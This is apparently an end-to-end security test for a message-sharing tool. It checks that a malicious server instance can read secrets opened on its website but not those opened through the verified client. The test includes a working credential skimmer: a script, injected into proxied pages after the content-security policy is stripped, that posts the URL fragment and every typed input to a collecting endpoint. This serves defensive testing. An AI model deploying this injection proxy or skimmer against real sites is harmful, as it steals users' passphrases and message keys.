import type { AddressInfo } from 'node:net';

import { type ChildProcessWithoutNullStreams, spawn } from 'node:child_process';
import { createServer, request as forward, type IncomingMessage, type Server, type ServerResponse } from 'node:http';
import { createInterface } from 'node:readline';

import { expect, test } from '../support/fixtures.ts';
import { createMessageInPage, expectMessageShown, showMessage } from '../support/pages.ts';
import { BASE_URL, NYLZO_BINARY } from '../support/servers.ts';

const PASSPHRASE = 'orbit maple velvet thunder';
const STEAL = `<script>fetch('/exfil',{method:'POST',body:location.hash});addEventListener('input',(event)=>fetch('/exfil',{method:'POST',body:String(event.target.value)}),true)</script>`;

interface HostileServer {
  readonly origin: string;
  readonly requests: string[];
  readonly loot: string[];
  readonly close: () => Promise<void>;
}

function relayed(incoming: IncomingMessage, outgoing: ServerResponse, origin: string, hostile: HostileServer): void {
  const instance = new URL(BASE_URL);
  const headers = { ...incoming.headers, host: instance.host, 'accept-encoding': 'identity' };
  for (const name of ['origin', 'referer'] as const) {
    const value = headers[name];
    if (typeof value === 'string') {
      headers[name] = value.replace(origin, () => BASE_URL);
    }
  }
  const target = {
    hostname: instance.hostname,
    port: instance.port,
    path: `/${(incoming.url ?? '/').replace(/^\/+/, '')}`,
    method: incoming.method ?? 'GET',
    headers,
  };
  const upstream = forward(target, (answer) => {
    const chunks: Buffer[] = [];
    answer.on('data', (chunk: Buffer) => {
      chunks.push(chunk);
    });
    answer.on('end', () => {
      let body = Buffer.concat(chunks);
      const answerHeaders = { ...answer.headers };
      if (String(answerHeaders['content-type']).startsWith('text/html')) {
        delete answerHeaders['content-security-policy'];
        body = Buffer.from(body.toString('utf8').replace('<head>', () => `<head>${STEAL}`));
      }
      delete answerHeaders['content-length'];
      outgoing.writeHead(answer.statusCode ?? 502, answerHeaders);
      outgoing.end(body);
    });
  });
  upstream.on('error', () => outgoing.writeHead(502).end());
  incoming.pipe(upstream);
  hostile.requests.push(`${incoming.method} ${incoming.url}`);
}

async function startHostileServer(): Promise<HostileServer> {
  const requests: string[] = [];
  const loot: string[] = [];
  let origin = '';
  const hostile: HostileServer = {
    get origin() {
      return origin;
    },
    requests,
    loot,
    close: async () =>
      new Promise((resolve) => {
        server.closeAllConnections();
        server.close(() => resolve());
      }),
  };
  const server: Server = createServer((incoming, outgoing) => {
    if (incoming.url === '/exfil') {
      const chunks: Buffer[] = [];
      incoming.on('data', (chunk: Buffer) => {
        chunks.push(chunk);
      });
      incoming.on('end', () => {
        loot.push(Buffer.concat(chunks).toString('utf8'));
        outgoing.writeHead(204).end();
      });
      return;
    }
    relayed(incoming, outgoing, origin, hostile);
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  return hostile;
}

interface Running {
  readonly firstLine: Promise<string>;
  readonly process: ChildProcessWithoutNullStreams;
}

function runNylzo(parameters: readonly string[], input = ''): Running {
  const child = spawn(NYLZO_BINARY, parameters, { stdio: 'pipe' });
  child.stdin.end(input);
  const lines = createInterface({ input: child.stdout });
  const firstLine = new Promise<string>((resolve, reject) => {
    lines.once('line', resolve);
    child.once('exit', (code) => reject(new Error(`nylzo ${parameters[0]} exited with ${String(code)}`)));
  });
  return { firstLine, process: child };
}

test(
  'a hostile instance reads a message opened on its website, but sees only API calls from the verified client (A3-01)',
  { tag: '@cross-browser' },
  async ({ newPage }) => {
    test.setTimeout(120_000);
    const hostile = await startHostileServer();
    const running: Running[] = [];
    try {
      const website = await newPage();
      const control = await createMessageInPage(website, { text: 'read on the website', passphrase: PASSPHRASE });
      const fragment = control.slice(control.indexOf('#'));
      const victim = await newPage();
      await showMessage(
        victim,
        control.replace(BASE_URL, () => hostile.origin),
        PASSPHRASE,
      );
      await expectMessageShown(victim);
      await expect.poll(() => hostile.loot).toContain(fragment);
      await victim.close();
      await website.close();

      hostile.requests.length = 0;
      hostile.loot.length = 0;
      const web = runNylzo(['web', '--no-browser', '--server', hostile.origin]);
      running.push(web);
      const address = await web.firstLine;
      const local = address.replace(/\/$/, '');
      expect(local).toMatch(/^http:\/\/127\.0\.0\.1:\d+$/);
      const sender = await newPage();
      const link = await createMessageInPage(
        sender,
        { text: 'read in the verified client', passphrase: PASSPHRASE },
        local,
      );
      expect(link.startsWith(`${hostile.origin}/m/`), 'links from the verified client name the instance').toBe(true);

      const open = runNylzo(['open', '--no-browser', '--server', hostile.origin], link);
      running.push(open);
      const handoff = await open.firstLine;
      expect(handoff).toMatch(/^http:\/\/127\.0\.0\.1:\d+\/open#[A-Z2-7]{26}$/);
      expect(handoff).not.toContain(link.slice(link.indexOf('#') + 1));
      const reader = await newPage();
      await reader.goto(handoff);
      await reader.getByLabel('Passphrase', { exact: true }).fill(PASSPHRASE);
      await reader.getByRole('button', { name: 'Show message' }).click();
      await expectMessageShown(reader);
      await expect(reader.locator('pre')).toHaveText('read in the verified client');
      expect(reader.url()).not.toContain('#');

      expect(hostile.loot).toEqual([]);
      expect(hostile.requests.length).toBeGreaterThan(0);
      for (const seen of hostile.requests) {
        expect(seen, 'the instance received something other than an API call').toMatch(/^(?:GET|POST) \/api\/v1\//);
        expect(seen).not.toContain(link.slice(link.indexOf('#') + 1));
      }
    } finally {
      for (const { process } of running) {
        process.kill('SIGTERM');
      }
      await hostile.close();
    }
  },
);
